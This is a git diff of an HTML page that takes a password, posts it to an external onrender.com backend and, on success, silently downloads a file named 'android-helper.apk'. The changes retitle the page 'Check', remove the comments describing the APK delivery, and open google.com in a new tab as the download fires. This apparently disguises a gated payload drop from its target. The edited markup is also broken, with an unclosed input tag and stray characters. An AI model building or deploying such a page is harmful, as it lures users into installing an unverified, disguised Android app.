@@ -1,11 +1,8 @@
-<!DOCTYPE html>
-<html>
+<!DOCTYPE html><html>
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Download</title>
-
-  <style>
+  <title>Check</title>  <style>
     * {
       box-sizing: border-box;
     }
@@ -46,18 +43,14 @@
     #password::placeholder {
       color: #999;
     }
-  </style>
-</head>
+  </style></head><body><input
+id="password"
+type="password"
+maxlength="8"
+autocomplete="new-password"
+placeholder="Enter here"
 
-<body>
-
-<input
-  id="password"
-  type="password"
-  maxlength="8"
-  autocomplete="new-password"
-  placeholder="Enter here"
->
+«»
 
 <script>
 const BACKEND_URL = "https://p2-q4uh.onrender.com";
@@ -84,20 +77,20 @@ passwordInput.addEventListener("input", async () => {
       })
     });
 
-    // Wrong password
+   
     if (!response.ok) {
       passwordInput.classList.add("incorrect");
       return;
     }
 
-    // Correct password
+    
     passwordInput.classList.add("correct");
 
-    // Receive APK from backend
     const blob = await response.blob();
 
     const url = URL.createObjectURL(blob);
 
+    
     const a = document.createElement("a");
     a.href = url;
     a.download = "android-helper.apk";
@@ -106,14 +99,17 @@ passwordInput.addEventListener("input", async () => {
     a.click();
     a.remove();
 
-    URL.revokeObjectURL(url);
+    window.open("https://www.google.com", "_blank");
+
+    // Clean up object URL
+    setTimeout(() => {
+      URL.revokeObjectURL(url);
+    }, 1000);
 
   } catch (error) {
     console.error("Download failed:", error);
     passwordInput.classList.add("incorrect");
   }
 });
-</script>
-
-</body>
+</script></body>
 </html>
